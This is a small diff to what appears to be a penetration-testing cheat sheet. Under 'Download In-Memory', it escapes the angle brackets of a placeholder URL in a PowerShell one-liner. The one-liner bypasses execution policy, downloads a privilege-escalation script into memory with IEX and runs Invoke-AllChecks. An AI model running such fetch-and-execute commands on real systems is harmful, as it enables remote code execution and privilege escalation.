@@ -6,7 +6,7 @@
 
 #### Download In-Memory:
 
-* powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://<PRIVESC URL>’); Invoke-AllChecks”
+* powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://\<PRIVESC URL\>’); Invoke-AllChecks”
 
 ## Simple Download:
 
